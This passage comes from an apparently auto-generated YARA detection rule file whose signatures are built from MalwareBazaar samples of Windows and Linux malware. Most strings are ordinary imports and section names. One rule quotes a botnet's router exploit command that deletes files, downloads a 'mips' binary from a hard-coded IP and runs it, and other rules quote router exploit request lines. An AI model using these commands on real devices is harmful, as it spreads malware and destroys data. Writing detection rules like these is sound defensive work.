        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "TlsGetValue"
        $s7 = "GetModuleHandleW"
        $s8 = "WriteFile"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetUserDefaultLCID"
        $s11 = "OLEAUT32.dll"
        $s12 = "GetModuleFileNameA"
        $s13 = "SetLastError"
        $s14 = "OpenThread"
        $s15 = "ExitProcess"
        $s16 = "GetProcAddress"
        $s17 = "NSET"
        $s18 = "LoadLibraryA"
        $s19 = "CreateFileA"
        $s20 = "GetConsoleCP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6068KB and
        all of them
}

rule Windows_a5c3953bc98a6e0d255ef2349c578fe7d9c3acb9484c5d2c9c34673d1392c431
{
    meta:
        description = "Auto ML: a5c3953bc98a6e0d255ef2349c578fe7d9c3acb9484c5d2c9c34673d1392c431"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "RegSetValueExW"
        $s8 = "RegCloseKey"
        $s9 = "RegDeleteValueW"
        $s10 = "RegDeleteKeyW"
        $s11 = "OpenProcessToken"
        $s12 = "RegOpenKeyExW"
        $s13 = "RegCreateKeyExW"
        $s14 = "ADVAPI32.dll"
        $s15 = "SHFileOperationW"
        $s16 = "SHGetFileInfoW"
        $s17 = "SHGetPathFromIDListW"
        $s18 = "ShellExecuteExW"
        $s19 = "SHELL32.dll"
        $s20 = "CoCreateInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2410KB and
        all of them
}

rule Windows_a5e0ccb21c5eba05f7ede4fcb26987e87e34ea05e1b71206882a847cf3e5e7bd
{
    meta:
        description = "Auto ML: a5e0ccb21c5eba05f7ede4fcb26987e87e34ea05e1b71206882a847cf3e5e7bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB and
        all of them
}

rule Linux_a60a88ba2b5562988d8a1ce4f949d4ff73ab8161af5688421ed59d753309a8ba
{
    meta:
        description = "Auto ML: a60a88ba2b5562988d8a1ce4f949d4ff73ab8161af5688421ed59d753309a8ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 38KB and
        all of them
}

rule Windows_a61589bc1fbf8a004af8b09f9140597f8f3fc40e7ede6c52bd77c8447d34f23a
{
    meta:
        description = "Auto ML: a61589bc1fbf8a004af8b09f9140597f8f3fc40e7ede6c52bd77c8447d34f23a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "paymentslip.exe"
        $s5 = "<Module>"
        $s6 = "System"
        $s7 = "System.Collections.Generic"
        $s8 = "System.Net"
        $s9 = "System.Collections"
        $s10 = "System.Security.Cryptography"
        $s11 = "System.IO"
        $s12 = "System.Text"
        $s13 = "System.Resources"
        $s14 = "System.Globalization"
        $s15 = "SocketError"
        $s16 = "System.Net.Sockets"
        $s17 = "System.Core"
        $s18 = "ReaderWriterLockSlim"
        $s19 = "System.Threading"
        $s20 = "Thread"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 845KB and
        all of them
}

rule Linux_a621dc87040c7173a7dc5c18d7accfc25aca6ec0325583d09e393adb375ccb9f
{
    meta:
        description = "Auto ML: a621dc87040c7173a7dc5c18d7accfc25aca6ec0325583d09e393adb375ccb9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB and
        all of them
}

rule Windows_a64124c02d6acf685b9103424aec264f00b73ef600cae68ba595df49f9072544
{
    meta:
        description = "Auto ML: a64124c02d6acf685b9103424aec264f00b73ef600cae68ba595df49f9072544"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_a669c566ce3a37ff309f341c95dffc017f2b77df2815b34ba1ec0f700dc7b0e7
{
    meta:
        description = "Auto ML: a669c566ce3a37ff309f341c95dffc017f2b77df2815b34ba1ec0f700dc7b0e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@wWIn@"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_a6de6e835a5908e907e01fbf14cb2f59644d11b574943b7e8ce3b0a703a0c025
{
    meta:
        description = "Auto ML: a6de6e835a5908e907e01fbf14cb2f59644d11b574943b7e8ce3b0a703a0c025"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = "CoCreateInstance"
        $s4 = "DeleteUrlCacheEntry"
        $s5 = "ExitProcess"
        $s6 = "GetCommandLineA"
        $s7 = "GetComputerNameA"
        $s8 = "GetCurrentProcessId"
        $s9 = "GetCurrentThreadId"
        $s10 = "GetExitCodeThread"
        $s11 = "GetFileSize"
        $s12 = "GetModuleFileNameA"
        $s13 = "GetModuleHandleA"
        $s14 = "CloseHandle"
        $s15 = "GetProcAddress"
        $s16 = "GetSystemDirectoryA"
        $s17 = "GetTempPathA"
        $s18 = "GetTickCount"
        $s19 = "GetVersion"
        $s20 = "GetVersionExA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 338KB and
        all of them
}

rule Linux_11cd0baa606e368f97d45a1967b485b81791bdf4bb88fd143b14cb212d82b3a5
{
    meta:
        description = "Auto ML: 11cd0baa606e368f97d45a1967b485b81791bdf4bb88fd143b14cb212d82b3a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%s/cmdline"
        $s9 = "/bin/systemd"
        $s10 = "/var/Challenget"
        $s11 = "[killer] Failed to create child process."
        $s12 = "deleted"
        $s13 = "payloadasdf"
        $s14 = "GET /%s HTTP/1.0"
        $s15 = "User-Agent: Update v1.0"
        $s16 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s17 = "No such file or directory"
        $s18 = "No such process"
        $s19 = "Interrupted system call"
        $s20 = "Bad file descriptor"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 162KB and
        all of them
}

rule Windows_a75d18534ff8dae63ffb7b62517b7b687342fa2ccfdc29e79a2fc20c62db33fa
{
    meta:
        description = "Auto ML: a75d18534ff8dae63ffb7b62517b7b687342fa2ccfdc29e79a2fc20c62db33fa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "Kingdom.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{9BA2988B-05A6-4543-A8F0-0D1E4C00866F}"
        $s15 = "<Module>{e590912d-89e4-41d0-b392-63551088f963}"
        $s16 = "get_Days"
        $s17 = "kernel32.dll"
        $s18 = "CreateThread"
        $s19 = "get_Message"
        $s20 = "WriteLine"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 359KB and
        all of them
}

rule Linux_a78c585914214e3c71123e41b7c9c220065cddd3b9aefbe909ebe9dc40e29ff0
{
    meta:
        description = "Auto ML: a78c585914214e3c71123e41b7c9c220065cddd3b9aefbe909ebe9dc40e29ff0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(!PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 26KB and
        all of them
}

rule Linux_a7bed39c0de17ecacc04d8b7eb70fea404ddb3f1ca0957904fb10d3dd3b2f870
{
    meta:
        description = "Auto ML: a7bed39c0de17ecacc04d8b7eb70fea404ddb3f1ca0957904fb10d3dd3b2f870"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB and
        all of them
}

rule Windows_a7ffba3e41ce82350677836a511daec0e105d77cc722bafc77007235eab2f1d4
{
    meta:
        description = "Auto ML: a7ffba3e41ce82350677836a511daec0e105d77cc722bafc77007235eab2f1d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<NicetyNippier>g__OpenMutex|0"
        $s5 = "HashSet`1"
        $s6 = "Microsoft.Win32"
        $s7 = "ReadInt32"
        $s8 = "ReadInt64"
        $s9 = "ReadUInt16"
        $s10 = "<Module>"
        $s11 = "System.IO"
        $s12 = "get_AxisX"
        $s13 = "ChewinkReferda"
        $s14 = "set_ChartArea"
        $s15 = "BordageTriga"
        $s16 = "ExsurgeTriga"
        $s17 = "KnowingCamelia"
        $s18 = "PelletEmporia"
        $s19 = "KnowingOpalina"
        $s20 = "LargetYantra"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1000KB and
        all of them
}

rule Windows_a809b6ffd9241ec430d4ab5c866566365b642a9e553f811cbf5f3dc5acdd0ce5
{
    meta:
        description = "Auto ML: a809b6ffd9241ec430d4ab5c866566365b642a9e553f811cbf5f3dc5acdd0ce5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System"
        $s6 = "GetString"
        $s7 = "System.IO"
        $s8 = "ModuleHandle"
        $s9 = "System.Collections.Generic"
        $s10 = "WriteLine"
        $s11 = "Close"
        $s12 = "Thread"
        $s13 = "System.Threading"
        $s14 = "System.Text"
        $s15 = "GetDirectoryName"
        $s16 = "File"
        $s17 = "ReadAllText"
        $s18 = "System.Reflection"
        $s19 = "GetExecutingAssembly"
        $s20 = "GetManifestResourceStream"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3958KB and
        all of them
}

rule Windows_a8905ed9ed1f5b9d74cee3da53ebc0a21af8cbcbf86504ac52f4234cc54c60e1
{
    meta:
        description = "Auto ML: a8905ed9ed1f5b9d74cee3da53ebc0a21af8cbcbf86504ac52f4234cc54c60e1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 241KB and
        all of them
}

rule Windows_a894df972f961b115a6567cc0769f235e211fd15ca89dbe2a03cee66507bfdbf
{
    meta:
        description = "Auto ML: a894df972f961b115a6567cc0769f235e211fd15ca89dbe2a03cee66507bfdbf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 257KB and
        all of them
}

rule Linux_a89a478321fbe617de49c92cd3b8f2adf889f73b0301f777156f2bade68bde11
{
    meta:
        description = "Auto ML: a89a478321fbe617de49c92cd3b8f2adf889f73b0301f777156f2bade68bde11"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_a8a3130c779904e23b50d69b4e73a714b345e296feebb9f64a732d5c73e7973b
{
    meta:
        description = "Auto ML: a8a3130c779904e23b50d69b4e73a714b345e296feebb9f64a732d5c73e7973b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "@.reloc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 223KB and
        all of them
}

rule Windows_a8c24a3e54a4b323973f61630c92ecaad067598ef2547350c9d108bc175774b9
{
    meta:
        description = "Auto ML: a8c24a3e54a4b323973f61630c92ecaad067598ef2547350c9d108bc175774b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "h.reloc"
        $s5 = "@.rsrc"
        $s6 = "kernel32.dll"
        $s7 = "GetProcessWindowStation"
        $s8 = "SetProcessAffinityMask"
        $s9 = "GetUserObjectInformationW"
        $s10 = "WTSAPI32.dll"
        $s11 = "_dUwIN"
        $s12 = "USEt"
        $s13 = "GETQ"
        $s14 = "iGeTnM"
        $s15 = "nGGeT"
        $s16 = "LoadLibraryA"
        $s17 = "GetModuleFileNameW"
        $s18 = "GetModuleHandleA"
        $s19 = "GetProcAddress"
        $s20 = "ExitProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7855KB and
        all of them
}

rule Windows_11d22d4281f0d9b237379e7bc5b2f301ae94f9028d94d043cefe1c08636ce9fd
{
    meta:
        description = "Auto ML: 11d22d4281f0d9b237379e7bc5b2f301ae94f9028d94d043cefe1c08636ce9fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 313KB and
        all of them
}

rule Windows_a8d74ed7b03a5b5b3b0d6d232d52b817b67be23e95e21eecac100b94ae05dfa6
{
    meta:
        description = "Auto ML: a8d74ed7b03a5b5b3b0d6d232d52b817b67be23e95e21eecac100b94ae05dfa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6621KB and
        all of them
}

rule Linux_a910f10b9709bfc2fee427dd671a37b1b49823f820df5902aadf174c73533d71
{
    meta:
        description = "Auto ML: a910f10b9709bfc2fee427dd671a37b1b49823f820df5902aadf174c73533d71"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB and
        all of them
}

rule Linux_a95c553ae1f438d8d07e40ec062ece319cce83feb4d94aba24aeb73483563363
{
    meta:
        description = "Auto ML: a95c553ae1f438d8d07e40ec062ece319cce83feb4d94aba24aeb73483563363"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 51KB and
        all of them
}

rule Windows_a95da78668adc1684d19248f50fb7ccf6083806cce94f65d3ec3c99bca4662ab
{
    meta:
        description = "Auto ML: a95da78668adc1684d19248f50fb7ccf6083806cce94f65d3ec3c99bca4662ab"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "regex_error(error_complexity): The complexity of an attempted match against a regular expression exceeded a pre-set level."
        $s7 = "GetTempPath2W"
        $s8 = "already connected"
        $s9 = "bad file descriptor"
        $s10 = "connection aborted"
        $s11 = "connection already in progress"
        $s12 = "connection refused"
        $s13 = "connection reset"
        $s14 = "file exists"
        $s15 = "file too large"
        $s16 = "filename too long"
        $s17 = "network reset"
        $s18 = "no child process"
        $s19 = "no such file or directory"
        $s20 = "no such process"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1670KB and
        all of them
}

rule Windows_a98b58b58466facbdb0c65e4e6a0a9d1ed875c0a10fa94bde52e3aa726337d84
{
    meta:
        description = "Auto ML: a98b58b58466facbdb0c65e4e6a0a9d1ed875c0a10fa94bde52e3aa726337d84"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "get_XQBI"
        $s11 = "getInstancia"
        $s12 = "get_paginaWebEmpresa"
        $s13 = "set_paginaWebEmpresa"
        $s14 = "get_razonSocialEmpresa"
        $s15 = "set_razonSocialEmpresa"
        $s16 = "get_direccionEmpresa"
        $s17 = "set_direccionEmpresa"
        $s18 = "get_correoEmpresa"
        $s19 = "set_correoEmpresa"
        $s20 = "get_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 678KB and
        all of them
}

rule Windows_a9accaab2a3a2a724d811b2e1cf86a08ad3754dcb2eb325188ab1c2a7543341f
{
    meta:
        description = "Auto ML: a9accaab2a3a2a724d811b2e1cf86a08ad3754dcb2eb325188ab1c2a7543341f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<FrmMain_Load>b__2_0"
        $s5 = "<FrmMain_Load>b__2_1"
        $s6 = "<FrmMain_Load>b__2_2"
        $s7 = "<Module>"
        $s8 = "set_SpeedX"
        $s9 = "get_EshZ"
        $s10 = "System.Collections.Generic"
        $s11 = "Read"
        $s12 = "Thread"
        $s13 = "add_Load"
        $s14 = "FrmMain_Load"
        $s15 = "get_OrangeRed"
        $s16 = "get_Speed"
        $s17 = "set_Speed"
        $s18 = "get_Enabled"
        $s19 = "set_Enabled"
        $s20 = "set_DoubleBuffered"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 636KB and
        all of them
}

rule Windows_a9c22a3fe2856a1c2afeccaad1188e6e4fab5990b800bbe6d02212909dea8f2e
{
    meta:
        description = "Auto ML: a9c22a3fe2856a1c2afeccaad1188e6e4fab5990b800bbe6d02212909dea8f2e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "code_understanding_and_program_installation.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4744KB and
        all of them
}

rule Windows_a9dceb6c6c9faeb5788ff9dc3288a1ab2bd128b6765c817f82e967401e10f6e4
{
    meta:
        description = "Auto ML: a9dceb6c6c9faeb5788ff9dc3288a1ab2bd128b6765c817f82e967401e10f6e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "ORGDEFgGgC.exe"
        $s5 = "System"
        $s6 = "System.Collections.Generic"
        $s7 = "System.Collections"
        $s8 = "System.Diagnostics"
        $s9 = "System.Globalization"
        $s10 = "BinaryReader"
        $s11 = "System.IO"
        $s12 = "System.IO.Compression"
        $s13 = "ModuleHandle"
        $s14 = "System.Reflection"
        $s15 = "System.Reflection.Emit"
        $s16 = "Module"
        $s17 = "System.Runtime.CompilerServices"
        $s18 = "System.Security.Cryptography"
        $s19 = "STAThreadAttribute"
        $s20 = "System.Text"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 307KB and
        all of them
}

rule Windows_a9e0912c51dbd477ad269595657e9fc5d826e3d453fb83c9858bd76320a5a19e
{
    meta:
        description = "Auto ML: a9e0912c51dbd477ad269595657e9fc5d826e3d453fb83c9858bd76320a5a19e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4761KB and
        all of them
}

rule Windows_a9e6b9acb3f74abf0583a5552591a22eb279fe3f96f9316ec4449bd9d7116030
{
    meta:
        description = "Auto ML: a9e6b9acb3f74abf0583a5552591a22eb279fe3f96f9316ec4449bd9d7116030"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.reloc"
        $s2 = "@.rsrc"
        $s3 = "CreateCompatibleBitmap"
        $s4 = "USER32.dll"
